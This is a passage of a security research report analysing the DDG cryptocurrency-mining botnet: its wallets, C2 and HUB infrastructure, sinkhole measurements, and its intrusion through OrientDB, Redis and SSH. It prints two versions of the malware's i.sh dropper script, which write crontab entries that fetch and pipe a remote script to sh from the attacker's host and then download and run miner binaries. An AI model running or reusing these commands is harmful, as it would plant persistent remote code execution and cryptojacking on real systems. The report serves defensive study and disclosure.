Further analysis found\nthat this is a long-running botnet whose main goal is to mine Monero CryptoCurrency. We name it DDG.Mining.Botnet after its\ncore function module name DDG.\n\nCurrently we are able to confirm that the botnet has mined more than 3,395 Monroe coins, equivalent to USD 925,383 at current\nprices. In addition, there is another 2,428 XMRs (equivalent to USD 661,759) we have yet to fully confirm due to the mining pool's\npayment record issue. This makes DDG by far the second largest Monroe related botnet we have seen, just behind the MyKings\nBotnet we reported earlier.\n\nDDG code appears at least late in 2016 and is continuously updated throughout 2017.\n\nDDG uses a C2 and HUB layout to communicate with its clients. The HUB is a set of IPs and domain names that are used to\nprovide Miner program for the compromised clients to download.\n\nIt is worth noting that we were able to successfully register and sinkhole two domain names used by its v2011 version, thus we\nwere able to have a good understanding of the size of the entire DDG botnet based on Sinkhole data.\n\n**DDG Mining Botnet Total Incoming**\n\nDDG uses the following mine pool:\n\n[https://monero.crypto-pool.fr/](https://monero.crypto-pool.fr/)\n\nThree wallet addresses have been used, as follows:\n\n**Wallet #1**\n4AxgKJtp8TTN9Ab9JLnvg7BxZ7Hnw4hxigg35LrDVXbKdUxmcsXPEKU3SEUQxeSFV3bo2zCD7AiCzP2kQ6VHouK3KwnTKYg\n**Wallet #2**\n45XyPEnJ6c2STDwe8GXYqZTccoHmscoNSDiTisvzzekwDSXyahCUmh19Mh2ewv1XDk3xPj3mN2CoDRjd3vLi1hrz6imWBR1\n**Wallet #3**\n44iuYecTjbVZ1QNwjWfJSZFCKMdceTEP5BBNp4qP35c53Uohu1G7tDmShX1TSmgeJr2e9mCw2q1oHHTC2boHfjkJMzdxumM\n\nAmong them, Wallet#3 was the first wallet address been used, most active between the time period 2017-02~2017-03; then\nfollowed by Wallet#1, been used most of the 2017; Wallet#2 is a recent active one first seen on 2018-01-03.\n\nThe pool allows us to check the payment record of the wallets. The income of all three wallets is shown in the following table. The\ntotal income is Monroe 3,395 or 5,760. These tokens are worth USD 925,383 or 1,569,963 today. Note: There is an issue for the\nsecond wallet, where \"Total Paid\" is not consistent with the summary of all tractions' amount. We cannot confirm which number is\nmore accurate, so we show both numbers here.\n\n**DDG Mining Botnet Workflow**\n\nBy analyzing the sample and its behavior, we can characterize the DDG Mining Botnet attack as follows:\n\n\n-----\n\nIn the picture above, DDG Mining Botnet attack process can be divided into several stages:\n\n**Initial Scanning: The attacker (ss2480.2) exploits the known RCE vulnerability of the OrientDB database and drops the**\nattack payload\n**Stage 1: Attackers modify local Crontab scheduled tasks, download and execute i.sh (hxxp: //218.248.40.228:8443/i.sh) on**\nthe primary server and keep it synchronized every 5 minutes\n**Stage 2: DDG traverses the built-in file hub_iplist.txt, check the connectivity of every single entry and try to download the**\ncorresponding Miner program wnTKYg from the one can be successfully connected (wnTKYg.noaes if the native CPU does\nnot support AES-NI)\n**Mining Stage: The Miner program begins to use the computing resources of the compromised host to begin mining for the**\nattacker's wallet.\n\nThe HUB used in the second phase is a very interesting design. The attacker goes over all IPs and domain names written in the\nHUB file to download the mining program, so as to avoid the possible blocking caused by using a single download server. We\nobserve that DDG operators update the IP and domain names of these HUB from time to time, and most of these ips and\ndomains are hacked boxes. See the entire HUB list at the end.\n\nIn v2011, somehow two domain names out of three on the list were left unregistered, so we went ahead and registered them, as\nfollows.\n\ndefaultnotepad567[.]com\nunains1748[.]com unregistered\n5dba35bsmrd[.]com unregistered\n\nBelow we will introduce the DDG botnet C2s, HUB, and Bot respectively.\n\n**The C2s**\n\nThe DDG botnet uses the following C2 to maintain control of the device:\n\n202.181.169.98:8443/i.sh\n218.248.40.228:8443/i.sh\n\nThe first C2 was only used by this botnet briefly. And the second C2 has been pretty much the only active C2 for the last two\nyears.\n\n**The HUB and Our Sinkhole**\n\n\n-----\n\nDDG botnet uses HUB_IP: 8443\\wnTKYg to provide miner program. The detailed list of the two versions of HUB we monitored is\ngiven in the IoC section at the end of this article. The country distribution is shown in the following table. Most of the victims can\nbe seen in China.\n\nAs we mentioned before, DDG bot will go over and check connectivity of every single one of the IPs and domain names on the\nhub list, which means we were able to get a very accurate infected clients list by sinkhole the above two domains.\n\nThe DDG operators noticed this after about 20 days and subsequently released an updated version of DDG code that replaced all\nIPs and domain names, including our Sinkholed domains. But the time is long enough for us to have some good measurement of\nthis botnet.\n\n**Use Sinkhole Data to Measure DDG Mining Botnets**\n\n**From the sinkhole data, we recorded a total of 4,391 IP addresses of victims from all countries, with the most prominent**\n**victims being China (73%) and the United States (11%):**\n\n\n-----\n\nAnd the following diagram shows the overall trend of the victim's DNS requests for the above two domains.\n\n\n-----\n\nTo avoid abuse, the list of all victims IP is not made public.\n\n**A DNSMon Perspective**\n\nOur DNSMon is also aware of these three domain names, the traffic access patterns of these 3 domains match very well as can\nbe seen from the first diagram:\n\nAnd the second diagram show that these 3 domains have very strong correlations.\n\n\n-----\n\n## DDG Mining Botnet Attack Process Breakdown\n\nInitial Scanning\n\nThe scanning and intrusion phase of DDG Mining Botnet is done by sample ss2480.2. The ss2408.2 scans port 2480 and then\n[uses the OrientDB RCE Vulnerability CVE-2017-11467 to implement the intrusion.](https://blogs.securiteam.com/index.php/archives/3318)\n\nss2480.2 will first scan the internal network, and then scan the public network segment. The internal target IP ranges are:\n\n**10.Y.x.x/16 (Y is the value of the current intranet IP B segment)**\n**172.16.x.x/16**\n**192.168.x.x/16**\n\n\n-----\n\nAfter the internal networks scan, ss2480.2 visits hxxp://v4.ident.me to get a public IP address of the current host WAN_IP, then\nusing WAN_IP/8 to generate public Target IP ranges. All the reserved address segments will be filtered:\n\n\n-----\n\nStage 1\n\nHere is the main configuration URL of DDG, the IP 218.248.40.228 is located in India, AS9829:\n\n**hxxp://218.248.40.228:8443/i.sh**\n\nThis i.sh has changed many times, but the content is more or less the same, below is an early version, with following main\nfunctions:\n\n\n-----\n\nSynchronize local Crontab with i.sh from the C2 server\nDownload and execute DDG sample from the C2 server\nCheck and clear the old version of the local DDG process\n```\nexport PATH=$PATH:/bin:/usr/bin:/usr/local/bin:/usr/sbin\necho \"*/5 * * * * curl -fsSL http://218.248.40.228:8443/i.sh?6 | sh\" > /var/spool/cron/root \nmkdir -p /var/spool/cron/crontabs \necho \"*/5 * * * * curl -fsSL http://218.248.40.228:8443/i.sh?6 | sh\" > /var/spool/cron/crontabs/root\nif [ ! -f \"/tmp/ddg.2011\" ]; then \n  curl -fsSL http://218.248.40.228:8443/2011/ddg.$(uname -m) -o /tmp/ddg.2011\nfi \nchmod +x /tmp/ddg.2011 && /tmp/ddg.2011\n#if [ ! -f \"/tmp/ss2480.2\" ]; then\n  #curl -fsSL http://218.248.40.228:8443/ss2480.2 -o /tmp/ss2480.2\n#fi\n#chmod +x /tmp/ss2480.2 && /tmp/ss2480.2\nps auxf | grep -v grep | grep ss2480.1 | awk '{print $2}' | kill \n#ps auxf | grep -v grep | grep ss22522.1 | awk '{print $2}' | kill\n#ps auxf | grep -v grep | grep ss22522.2 | awk '{print $2}' | kill\n#ps auxf | grep -v grep | grep ddg.1010 | awk '{print $2}' | kill\n#ps auxf | grep -v grep | grep ddg.1021 | awk '{print $2}' | kill\n#ps auxf | grep -v grep | grep ddg.2001 | awk '{print $2}' | kill\n#ps auxf | grep -v grep | grep ddg.2003 | awk '{print $2}' | kill\n#ps auxf | grep -v grep | grep ddg.2004 | awk '{print $2}' | kill\n#ps auxf | grep -v grep | grep ddg.2005 | awk '{print $2}' | kill\n#ps auxf | grep -v grep | grep ddg.2006 | awk '{print $2}' | kill\n#ps auxf | grep -v grep | grep ddg.2010 | awk '{print $2}' | kill\n#ps auxf | grep -v grep | grep ddg.2011 || rm -rf /tmp/ddg.2011\n\n```\nThe i.sh script gives attacker very flexible control to deliver any malicious software to the compromised host. And we did see this\nfile change from time to time to serve new Trojan files or to deliver malware that incorporates new attacks. For example:\n\n**DDG Samples: the ddg.$(uname -m) series. This the long-run payload, we have seen three version, V2011, V2020 and**\nV2021\n**ss22522 Samples: Only work for a short period, against the Struts2 vulnerability S2-052**\n**ss2480 Samples: Also for a short period too, against OrientDB RCE. This is the very sample exposed DDG to us**\n\nBy the way there is an issue in early version of i.sh, where a \"xargs\" is missing just ahead of 'kill' command, so the older process\nwill not get killed as intended. This issue is fixed in later version.\n\nOn 2018.1.3, the attacker pushed out the newest version of i.sh (v2021.2), adding another mining process imWBR1, which uses\nthe second XMR wallet listed earlier:\n\n\n-----\n\n```\n p\necho \"*/5 * * * * curl -fsSL http://218.248.40.228:8443/i.sh | sh\" > /var/spool/cron/root \necho \"*/5 * * * * wget -q -O- http://218.248.40.228:8443/i.sh | sh\" >> /var/spool/cron/root \nmkdir -p /var/spool/cron/crontabs \necho \"*/5 * * * * curl -fsSL http://218.248.40.228:8443/i.sh | sh\" > /var/spool/cron/crontabs/root \necho \"*/5 * * * * wget -q -O- http://218.248.40.228:8443/i.sh | sh\" >> /var/spool/cron/crontabs/root\nif [ ! -f \"/tmp/ddg.2021\" ]; then \n  curl -fsSL http://218.248.40.228:8443/2021/ddg.$(uname -m) -o /tmp/ddg.2021\nfi\nif [ ! -f \"/tmp/ddg.2021\" ]; then \n  wget -q http://218.248.40.228:8443/2021/ddg.$(uname -m) -O /tmp/ddg.2021\nfi\nchmod +x /tmp/ddg.2021 && /tmp/ddg.2021\nif [ ! -f \"/tmp/imWBR1\" ]; then \n  curl -fsSL http://218.248.40.228:8443/imWBR1 -o /tmp/imWBR1 --compressed\nfi\nps auxf | grep -v grep | grep Circle_MI | awk '{print $2}' | xargs kill \nps auxf | grep -v grep | grep get.bi-chi.com | awk '{print $2}' | xargs kill \nps auxf | grep -v grep | grep hashvault.pro | awk '{print $2}' | xargs kill \nps auxf | grep -v grep | grep nanopool.org | awk '{print $2}' | xargs kill \nps auxf | grep -v grep | grep minexmr.com | awk '{print $2}' | xargs kill \nps auxf | grep -v grep | grep /boot/efi/ | awk '{print $2}' | xargs kill \n#ps auxf | grep -v grep | grep ddg.2006 | awk '{print $2}' | kill\n#ps auxf | grep -v grep | grep ddg.2010 | awk '{print $2}' | kill\n\n```\nStage 2\n\nAt this phase, DDG tries to test all the hosts in the hub_iplist.txt, and if success DDG will visit hxxp://hub_ip:8443/wnTKYg to\ndownload and execute the corresponding program wnTKYg Miner (if the native CPU does not support AES-the NI, it will\ndownload wnTKYg.noaes).\n\nAll the ddg.xxx and ss2480.xxx were written in Golang. DDG communicate to the HUB with a third party Golang Stream\nMultiplexing library Smuxcompleted. The default Smux configuration is been used.\n\nSo after DDG downloads Miner from the HUB and starts to KeepAlive, it sends 2 packets to the connected HUB IP every 10s:\n\n\n-----\n\n## The Built-in Hub_iplist.txt\n\nThe original DDG sample download URL is hxxp://218.248.40.228:8443/2011/ddg.$(uname -m), as written in i.sh. There are 158\nhub_ip:8443 and 3 hub_domain:8443 listed in the hub_iplist, two of which are unregistered and then registered by us.\n\nOn 2017-11-10 We found that there is a change in the contents of i.sh file, ddg sample download link has changed to\nhxxp://218.248.40.228:8443/2020/ddg.$(uname -m). The attacker replaced all HUP IPs and domain names including ours. The\nlatest contents of hub_iplist.txt can be seen at the bottom of this blog ip_hublist (v2020 ~ v2021) .\n\n## DDG Mining Botnet Also Targeted Redis Database and SSH Service\n\nThe above analysis focuses on the OrientDB exploit (ss2480 series).\n\nIn fact, the DDG samples also target SSH and Redis services as well, which are another two major methods used by DDG to\ncompromise vulnerable hosts. Some of the related functions and the password dictionary are shown in the following two figures:\n\n\n-----\n\nThe victim is also implanted with the X509 key files. Three key files built into the sample are as follows, details at the end of the\narticle:\n\n1. slave.pem\n2. ca.pem\n3. slave.key\n\nLooking at historical data, we can also see the i.sh host 218.248.40.228 scanning the Redis database early on. A google search\nturned up some posts complaining their server was infested with ddg botnet. The following diagram shows the ports that were\nscanned by 218.248.40.228 between 2017-09-27 20:00:00 ~ 2017-10-25 11:00:00. Port\n\n6379, 7379 and 2480 represents Redis, Redis (Replicas) and OrientDB:\n\n\n-----\n\n## One more thing\n\nStarting from 2018.1.25 at 21 o'clock (GMT+8), we saw another update of this botnet, with link\nhxxp://218.248.40.228:8443/2011/ddg.x86_64, and this time it deliveries a Mirai family sample.\n\n**Family : mirai**\n**C2 : linuxuclib.com:8080**\n**C2 : jbeupq84v7.2y.net, no IP address
